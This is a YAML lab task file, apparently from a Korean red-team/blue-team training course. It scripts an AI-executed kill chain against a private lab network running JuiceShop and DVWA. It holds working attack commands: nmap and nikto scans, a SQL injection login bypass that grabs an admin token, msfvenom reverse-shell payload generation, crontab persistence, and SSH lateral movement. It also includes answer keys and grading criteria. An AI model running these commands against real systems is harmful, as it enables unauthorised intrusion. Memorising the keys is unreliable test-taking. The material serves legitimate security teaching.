lab_id: battle-adv-ai-week14
title: 레드팀 vs 블루팀 실전 공방전 — 완전한 작전 수행 (AI 지원)
version: ai
course: battle-adv-ai
week: 14
description: Red Team과 Blue Team이 동일한 인프라에서 완전한 공방전을 수행한다. Red Phase에서 전체 킬체인을 실행하고,
  Blue Phase에서 실시간 탐지/차단/대응을 수행한다. 최종적으로 공격 성과와 방어 성과를 정량적으로 비교한다. AI SubAgent가 자동으로
  명령을 실행하고 결과를 검증합니다.
difficulty: hard
duration_minutes: 150
objectives:
- 완전한 Red Team 작전을 자율적으로 수행한다
- 실시간 Blue Team 대응을 구현한다
- Red/Blue 성과를 정량적으로 비교 평가한다
- 전문적인 공방전 분석 보고서를 작성한다
prerequisites:
- battle-adv-nonai week13 이수
infra_requirements:
- attacker (10.20.30.201) — nmap, metasploit, sqlmap, hydra, nikto
- secu (10.20.30.1) — nftables, suricata
- web (10.20.30.80) — apache, modsecurity, JuiceShop(:3000), DVWA(:8080)
- siem (10.20.30.100) — wazuh-manager
pass_threshold: 0.6
steps:
- order: 1
  instruction: '[RED] 작전 계획 수립 — OpOrder를 작성하고 공격 표면을 매핑하라. 목표, 범위, RoE, 타임라인을 정의하라.'
  hint: Operation Order 형식으로 문서화하고 nmap으로 공격 표면을 스캔한다.
  category: recon
  points: 10
  answer: '🤖 프롬프트: [RED] 작전 계획 수립 — OpOrder를 작성하고 공격 표면을 매핑하라 구현 방법과 예시를 설명해줘

    📎 참고 (CLI): echo ''=== RED TEAM OPORDER ==='' && echo ''Op: CRIMSON TIDE | Target:
    10.20.30.0/24 | Objective: Full kill chain'' && echo ''RoE: No DoS, No data destruction,
    Scope: 10.20.30.0/24 only'' && echo '''' && echo ''=== Attack Surface ==='' &&
    nmap -sV --top-ports 30 --max-retries 1 --host-timeout 15s -T4 10.20.30.80 2>&1
    | tail -10 && echo ''Priority: P1=JuiceShop(:3000), P2=DVWA(:8080), P3=SSH(:22)'''
  answer_detail: OpOrder는 레드팀 작전의 기본 문서이다. 공격 표면 매핑으로 JuiceShop이 P1, DVWA가 P2로 설정된다.
  verify:
    type: output_contains
    expect:
    - OPORDER
    - OpOrder
    semantic:
      intent: '[RED] OpOrder 작전 계획 /tmp/red_opord.md — Operation Objective (구체 목표:
        JuiceShop admin 접근·DB dump) + Scope (허용 IP 10.20.30.0/24·제외 자산) + Rules of
        Engagement (허용 기법·파괴 금지·time window·escalation) + Timeline (T+0 Recon T+30
        Initial T+60 Lateral T+90 Exfil). 실전 Red Team 운영 문서 형식'
      success_criteria:
      - /tmp/red_opord.md 파일
      - Objective + Scope + RoE + Timeline 4요소
      - 실전 Red Team 문서 포맷
      acceptable_methods:
      - cat > file + OpOrder 5-paragraph 포맷
      - 군사 5-paragraph order 참조 (SMEAC)
      - NIST SP 800-115 Pentest 가이드
      negative_signs:
      - 4요소 미흡
      - RoE 없음
      - 실전 포맷 아님
  target_vm: attacker
  script: 'echo ''=== RED TEAM OPORDER ==='' && echo ''Op: CRIMSON TIDE | Target:
    10.20.30.0/24 | Objective: Full kill chain'' && echo ''RoE: No DoS, No data destruction,
    Scope: 10.20.30.0/24 only'' && echo '''' && echo ''=== Attack Surface ==='' &&
    nmap -sV --top-ports 30 --max-retries 1 --host-timeout 15s -T4 10.20.30.80 2>&1
    | tail -10 && echo ''Priority: P1=JuiceShop(:3000), P2=DVWA(:8080), P3=SSH(:22)'''
  risk_level: low
  bastion_prompt: '[RED] 작전 계획 수립 — OpOrder를 작성하고 공격 표면을 매핑하라. 목표, 범위, RoE, 타임라인을
    정의하라.


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 2
  instruction: '[RED] Phase 1 실행 — 초기 침투. SQLi로 JuiceShop 관리자 접근을 획득하고, nikto로 추가
    취약점을 탐색하라.'
  hint: SQLi 인증 우회 후 nikto로 웹 취약점을 스캔한다.
  category: exploit
  points: 10
  answer: '🤖 프롬프트: [RED] Phase 1 실행 — 초기 침투. SQLi로 JuiceShop 관리자 접근을 획득하고, nikto로
    추가 취약점을 탐색해줘

    📎 참고 (CLI): echo ''=== Phase 1: Initial Access ==='' && curl -s -X POST http://10.20.30.80:3000/rest/user/login
    -H ''Content-Type: application/json'' -d ''{"email":"\" OR 1=1--","password":"x"}''
    | python3 -m json.tool | head -5 && echo ''Admin token obtained via SQLi (T1190)''
    && nikto -h http://10.20.30.80:8080 -output /tmp/battle_nikto.txt 2>&1 | tail
    -10'
  answer_detail: 초기 침투에서 SQLi로 JuiceShop 관리자 접근을 획득하고, nikto로 DVWA의 추가 취약점을 탐색한다.
  verify:
    type: output_contains
    expect: Phase 1
    semantic:
      intent: '[RED] Phase 1 초기 침투 — curl POST /rest/user/login SQLi 로 JuiceShop admin
        JWT 획득 + nikto -h http://<web>:3000 -maxtime 60 로 추가 취약점 6,700+ 항목 검사. SQLi
        성공 시 API 접근 확보 + Nikto 로 병행 추가 벡터 탐색. 초기 침투의 complete 모델'
      success_criteria:
      - JuiceShop SQLi + Nikto 두 벡터
      - JWT 획득 + Nikto 결과
      - Initial Access 완전성
      acceptable_methods:
      - curl SQLi + nikto 병행
      - sqlmap + burp active scan
      - OpenVAS + SQLi
      negative_signs:
      - SQLi 또는 Nikto 한쪽만
      - JWT 미획득
      - 후속 연결 없음
  target_vm: attacker
  script: 'echo ''=== Phase 1: Initial Access ==='' && curl -s -X POST http://10.20.30.80:3000/rest/user/login
    -H ''Content-Type: application/json'' -d ''{"email":"\" OR 1=1--","password":"x"}''
    | python3 -m json.tool | head -5 && echo ''Admin token obtained via SQLi (T1190)''
    && nikto -h http://10.20.30.80:8080 -output /tmp/battle_nikto.txt 2>&1 | tail
    -10'
  risk_level: medium
  bastion_prompt: '[RED] Phase 1 실행 — 초기 침투. SQLi로 JuiceShop 관리자 접근을 획득하고, nikto로
    추가 취약점을 탐색해줘


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
- order: 3
  instruction: '[RED] Phase 2 실행 — Persistence + Lateral Movement. msfvenom 페이로드를
    생성(저장만)하고, crontab Persistence를 설치하고, SSH로 내부 서버에 접근하라.'
  hint: msfvenom으로 페이로드 생성 후, crontab과 SSH를 실행한다.
  category: exploit
  points: 10
  answer: '🤖 프롬프트: [RED] Phase 2 실행 — Persistence + Lateral Movement. msfvenom 페이로드를
    생성(저장만)하고, crontab Persistence를 설치하고, SSH로 내부 서버에 접근해줘

    📎 참고 (CLI): msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444
    -f elf -o /tmp/battle_payload.elf 2>&1 | tail -2 && echo "*/10 * * * * echo BATTLE_BEACON
    ※ /tmp/battle_beacon.txt" | crontab - && echo "Persistence installed (T1053.003)"
    && echo "--- Lateral Movement ---" && ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no
    ccc@10.20.30.1 "hostname" 2>&1 | head -2 && ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no
    ccc@10.20.30.100 "hostname" 2>&1 | head -2 && echo "Lateral movement to 2 hosts
    (T1021.004)"'
  answer_detail: Weaponization(msfvenom), Persistence(crontab), Lateral Movement(SSH)를
    연계하여 킬체인을 진행한다.
  verify:
    type: output_contains
    expect: Lateral movement
    semantic:
      intent: '[RED] Phase 2 Persistence + Lateral Movement — msfvenom -p linux/x64/shell_reverse_tcp
        -f elf -o /tmp/p14.elf (저장만) + (crontab -l; echo * * * * * echo PERSIST_TEST
        >> /tmp/.p14) | crontab - + ssh ccc@secu whoami && ssh ccc@web hostname (측면
        이동). Phase 1 성공 후 자연스러운 확장. Persistence + Lateral combo 전형적 APT 패턴'
      success_criteria:
      - msfvenom payload 생성 (실행 없음)
      - crontab persistence
      - ssh 측면 이동 2호스트
      - APT 확장 패턴
      acceptable_methods:
      - msfvenom + crontab + ssh 중첩
      - systemd service 대체
      - SSH ProxyJump -J
      negative_signs:
      - 1종 기법만
      - 실제 payload 실행
      - 측면 이동 없음
  target_vm: attacker
  script: msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f
    elf -o /tmp/battle_payload.elf 2>&1 | tail -2 && echo "*/10 * * * * echo BATTLE_BEACON
    ※ /tmp/battle_beacon.txt" | crontab - && echo "Persistence installed (T1053.003)"
